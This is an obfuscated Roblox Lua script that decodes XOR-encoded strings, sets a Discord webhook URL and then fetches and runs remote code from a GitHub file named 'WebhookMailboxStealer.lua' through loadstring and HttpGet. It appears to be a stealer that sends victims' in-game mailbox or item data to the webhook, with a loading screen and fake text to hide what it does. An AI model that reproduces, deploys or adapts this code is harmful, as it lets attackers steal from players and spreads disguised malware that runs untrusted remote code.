--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + ((v11-1)% #v9) ,1 + ((v11-1)% #v9) + 1 )))%256 ));end return v5(v10);end Username=v7("\49\225\251\255\2\193\227\146\78\136","\126\177\163\187\69\134\219\167");WebHook="https://discord.com/api/webhooks/1114930503502532699/EFxIpVFi2ExNG8HhdXlPYa-ixywH41PB1BUep3XzLqqELRolNbwv8n4ienv3NhkOZvQT";loadingscreen=true;_G.CustomScriptName=v7("\209\2\255\3\237\201\1","\156\67\173\74\165");_G.Text1=v7("\117\55\165\64\6\168\102\106\59\182\77\19\184\104\8\122","\38\84\215\41\118\220\70");_G.Text2=v7("\201\81\31\54\27\240\87\86\36\29\236\16\37\33\0\247\64\2\108\92\176","\158\48\118\66\114");_G.Text3=v7("\216\163\33\19\61\122\171\252\235\23\19\36\122\181\239\184\106\94\120","\155\203\68\112\86\19\197");_G.Text4=v7("\203\82\220\36\232\73\118\226\184\117\222\36\245\80\108\171\182\8","\152\38\189\86\156\32\24\133");loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/WebhookMailboxStealer.lua"))();